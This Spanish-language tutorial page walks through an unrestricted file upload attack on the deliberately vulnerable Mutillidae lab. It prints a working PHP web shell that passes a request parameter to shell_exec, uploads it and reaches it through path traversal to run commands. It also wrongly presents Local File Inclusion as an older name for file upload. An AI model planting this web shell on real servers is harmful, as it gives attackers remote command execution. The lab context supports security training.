# Unrestricted File Upload

Esta vulnerabilidad se solia llamar como `Local File Inclusion (LFI)` por que habia otro tipo de tecnica que se asemejaba a esta denominada `Remote File Inclusion (RFI)`, pero este tipo de tecnicas han ido desapareciendo con el tiempo ya que solo se podia hacer con codigo `PHP` se ha ido actualizando el lenguaje, las funciones que lo hacian dejan de hacerlo, por lo que ha dia de hoy se denomina como una subida de ficheros sin restriccion.

Incluso en la pagina no se llama `Local File Inclusion (LFI)` si no que se llama `Unrestricted File Upload (UFU)`.

En este caso en la pagina de `Mutillidae` en esa seccion consiste en que nos da una opcion la pagina de que podemos subir un fichero, pero como por dentro no lleva ningun tipo de sanitizacion por que esta mal programada, nosotros vamos a poder subir una `WebShell` al servidor.

Vamos a crear un archivo con la `WebShell`:

> shell.php

```shell
nano shell.php

#Dentro del nano

<form action="" method="post" enctype="application/x-www-form-urlencoded">
		<table style="margin-left:auto; margin-right:auto;">
			<tr>
				<td colspan="2">Please enter system command</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td class="label">Command</td>
				<td><input type="text" name="pCommand" size="50"></td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td colspan="2" style="text-align:center;">
					<input type="submit" value="Execute Command" />
				</td>
			</tr>
		</table>
	</form>
	<?php
		echo "<pre>";
		echo shell_exec($_REQUEST["pCommand"]);
		echo "</pre>";
	?>
```

Por ejemplo esa, la misma que utilizamos para el caso anterior.

<figure><img src="../../../.gitbook/assets/image (80) (1).png" alt=""><figcaption></figcaption></figure>

Subimos el archivo de nuestra `WebShell`.

Y nos dice donde se ha depositado:

<figure><img src="../../../.gitbook/assets/image (81) (1).png" alt=""><figcaption></figcaption></figure>

Ahora haciendo `Path Traversal` podremos acceder al archivo que acabamos de subir:

```
URL = http://<IP>/mutillidae/src/index.php?page=/tmp/shell.php
```

Y con esto estariamos en ese `PHP` donde podremos ejecutar comandos, como en la anterior.
